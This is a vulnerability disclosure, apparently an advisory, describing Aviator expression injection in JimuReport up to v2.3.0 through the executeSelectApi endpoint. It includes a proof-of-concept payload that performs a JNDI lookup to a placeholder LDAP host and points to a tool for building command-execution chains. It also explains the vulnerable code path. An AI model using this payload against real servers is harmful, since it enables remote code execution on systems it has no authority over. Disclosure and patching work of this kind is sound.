# jimureport aviator expression injection (≤ v2.3.0)

**Product**: jimureport

**Affected Versions**: ≤ v2.3.0

**address**: https://github.com/jeecgboot/jimureport

## Vulnerability Description

JimuReport versions 2.3.0 and below do not effectively restrict user input, directly delegating it to the `execute` method of the aviator expression, which leads to aviator expression injection.

## POC

### payload

```java
=use javax.naming.*;InitialContext.doLookup("ldap://x.x.x.x:x/exp")
```
Use java-chains to generate DruidJdbcAttack-H2 command execution chains.
https://github.com/vulhub/java-chains
<img width="1549" height="626" alt="image" src="https://github.com/user-attachments/assets/d86516b8-2259-4785-8fc5-eb2fb93edf3f" />

<img width="1873" height="827" alt="image" src="https://github.com/user-attachments/assets/56faf2ee-e03f-463b-aeda-2efa13ebd309" />

### code

The vulnerability in the `/jmreport/executeSelectApi` interface, located in `org.jeecg.modules.jmreport.desreport.b.a`.

The mapping receives the paramArray parameter and then calls the executeSelectApi method.

<img width="1206" height="547" alt="image" src="https://github.com/user-attachments/assets/0ae06f7f-2a72-4c4e-8376-502ab88f9ab7" />

Entering the if condition, method a is called.

<img width="1223" height="771" alt="image" src="https://github.com/user-attachments/assets/89e9cd69-09d1-4e9e-8b03-fac0af29c7b6" />

Then, the JSON is parsed, the paramValue parameter is extracted, enter the second if, and the ExpressUtil.a() method is called.

<img width="1203" height="781" alt="image" src="https://github.com/user-attachments/assets/944a3153-4347-408d-8960-106ab1b98e50" />

Entering the ExpressUtil.a method, we find that it calls the exp.execute method, and the object exp is compiled using the key parameter.

According to the code, the parameter `expression` is controllable; the only difference between it and the parameter `key` is the replacement of the equals sign.

It's also important to note that the condition `expression.startsWith("=")` must be true for the subsequent logic to proceed.Therefore, an equal sign was added at the beginning of the payload.

<img width="1066" height="789" alt="image" src="https://github.com/user-attachments/assets/f6f9e5b2-3437-47a8-ab94-4537e98c2dde" />
